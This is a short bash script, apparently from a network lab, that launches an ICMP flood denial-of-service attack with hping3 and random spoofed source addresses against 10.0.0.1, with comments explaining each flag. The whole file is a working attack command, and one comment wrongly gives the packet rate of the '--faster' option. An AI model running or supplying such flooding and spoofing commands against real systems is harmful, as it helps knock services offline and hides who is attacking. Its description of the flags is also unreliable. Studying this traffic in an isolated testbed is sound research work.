#!/bin/bash
#
# implements the (distributed) Dos attack via ICMP flooding with random spoofed source IP addresses

#while true 
#do
    hping3 -V --icmp --faster -o 44140 10.0.0.1 -c 2000 --rand-source &
    sleep 120
#done

# hping3 command explained argument-for-argument
## -V: verbose mode
## --icmp: ICMP mode/protocol to use=ICMP
## --faster: alias for -i u1000=sends 100 packets per second
## -o 44140: target port 44140
## 10.0.0.1: target host=10.0.0.1
## -c 2000: packet count=2000

## --rand-source: random source address mode/selects random IP addresses as the source address for the ICMP request
